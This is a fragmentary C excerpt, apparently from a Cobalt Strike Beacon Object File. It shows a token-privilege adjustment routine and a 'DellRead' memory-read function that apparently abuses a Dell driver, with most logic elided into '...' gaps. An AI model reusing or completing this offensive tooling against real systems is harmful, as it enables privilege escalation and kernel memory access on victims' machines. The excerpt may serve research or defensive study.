...
BOOL RequirePrivilege(LPCTSTR lpPrivilege) {
        ...
        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
			BeaconPrintf( CALLBACK_OUTPUT, "Failed to open process token\n");
			goto _END_OF_FUNC;
        }

        if (!ADVAPI32$LookupPrivilegeValueA(NULL, lpPrivilege, &luid)) {
			BeaconPrintf( CALLBACK_OUTPUT, "Failed to lookup priv name\n");
                goto _END_OF_FUNC;
        }
        ...
        // check KERNEL32$GetLastError() to check if privilege has been changed
        if (KERNEL32$GetLastError() != ERROR_SUCCESS) {
                BeaconPrintf( CALLBACK_OUTPUT, "AdjustTokenPriv failed with error: %ld\n", KERNEL32$GetLastError());
                goto _END_OF_FUNC;
        }
        bResult = TRUE;
...
DWORD64 DellRead(VOID* Address) {
	...
	if (!success) {
		BeaconPrintf( CALLBACK_OUTPUT, "[!] Memory read failed. 2\n");
...
void go(int arc, char* argv[]) {
	...
	if (result != 1) {
		BeaconPrintf( CALLBACK_OUTPUT, "[!] Priv failed with error %d\n", result);
		return;
	}
